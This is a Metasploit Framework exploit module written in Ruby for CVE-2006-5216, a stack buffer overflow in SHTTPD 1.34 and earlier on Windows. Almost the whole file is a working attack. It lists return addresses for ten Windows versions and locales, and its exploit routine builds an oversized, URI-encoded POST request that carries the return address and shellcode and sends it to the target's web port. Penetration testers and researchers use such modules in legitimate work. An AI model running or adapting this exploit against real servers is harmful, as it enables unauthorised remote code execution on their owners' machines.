##
# $Id: shttpd_post.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SHTTPD <= 1.34 URI-Encoded POST Request Overflow (win32)',
			'Description'    => %q{
					This module exploits a stack buffer overflow in SHTTPD <= 1.34.
				The vulnerability is caused due to a boundary error within the
				handling of POST requests. Based on an original exploit by skOd
				but using a different method found by hdm.
			},
			'Author'         => [ 'LMH <lmh [at] info-pull.com>', 'hdm', 'skOd'],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2006-5216'],
					[ 'OSVDB', '29565' ],
					[ 'URL', 'http://shttpd.sourceforge.net'],
					[ 'BID', '20393'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'BadChars' => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Except for Spanish locale target, all come from:
					# http://metasploit.com/users/opcode/msfopcode.cgi
					[ 'Windows NT English SP5-SP6',			{ 'Ret' => 0x776a183a } ],
					[ 'Windows 2000 Spanish SP4',			{ 'Ret' => 0x79496391 } ],
					[ 'Windows 2000 French SP4',			{ 'Ret' => 0x74fb108d } ],
					[ 'Windows 2000 English SP0-SP4',			{ 'Ret' => 0x75021421 } ],
					[ 'Windows 2000 French SP0-SP4',			{ 'Ret' => 0x74fa3144 } ],
					[ 'Windows 2003 Server English SP0-SP1',	{ 'Ret' => 0x77d877d3 } ],
					[ 'Windows XP German SP2',				{ 'Ret' => 0x71a02975 } ],
					[ 'Windows XP German SP1',				{ 'Ret' => 0x71a02a6a } ],
					[ 'Windows XP English SP2',				{ 'Ret' => 0x71aa1e08 } ],
					[ 'Windows XP English SP0-SP1',			{ 'Ret' => 0x71aa1aaa } ],
				],
			'DisclosureDate' => 'Oct 6 2006'))

		register_options(
			[
				Opt::RPORT(80)
			], self.class )
	end

	def exploit
		connect

		pat = rand_text_alphanumeric(4000)
		pat[8,4] = [target.ret].pack('V')
		pat[103, payload.encoded.length] = payload.encoded
		pat = Rex::Text.uri_encode(pat)

		res = "post /#{pat} HTTP/1.0\r\n\r\n"

		print_status("Trying target address 0x%.8x..." % target.ret)
		sock.put(res)
		sock.close

		handler
		disconnect
	end

end